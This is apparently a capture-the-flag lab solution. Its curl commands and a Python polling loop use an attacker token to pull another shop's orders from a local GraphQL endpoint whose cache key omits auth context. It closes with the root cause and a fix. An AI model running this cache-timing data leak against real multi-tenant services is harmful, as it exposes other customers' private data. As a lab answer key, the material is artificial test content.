# SOLUTION — Lab-09

```bash
# 1) baseline: your own shop always works
curl -X POST http://127.0.0.1:8009/graphql \
 -H "Authorization: Bearer attacker-token" -H "Content-Type: application/json" \
 -d '{"operationName":"GetOrders","variables":{"shop_id":"shop-999"}}' -i
# -> 200, X-Cache: MISS, your (empty) orders

# 2) victim shop: 403 on MISS...
curl -X POST http://127.0.0.1:8009/graphql \
 -H "Authorization: Bearer attacker-token" -H "Content-Type: application/json" \
 -d '{"operationName":"GetOrders","variables":{"shop_id":"shop-123"}}' -i
# -> 403, X-Cache: MISS

# 3) ...until you land inside the 4s window -> 200 + victim orders + flag
python -c "
import json, urllib.request, time
body = json.dumps({'operationName':'GetOrders','variables':{'shop_id':'shop-123'}}).encode()
for i in range(40):
    r = urllib.request.Request('http://127.0.0.1:8009/graphql', data=body,
        headers={'Content-Type':'application/json','Authorization':'Bearer attacker-token'})
    resp = urllib.request.urlopen(r)
    if resp.headers.get('X-Cache') == 'HIT':
        print('CAUGHT IT:'); print(resp.read().decode()[:400]); break
    time.sleep(1)
"
```

**Root cause:** user-specific response cached under a key without auth context.
The 4s TTL is fine; the key is the boundary.
**Fix:** include the auth context in the cache key (or don't cache
user-specific responses at all).
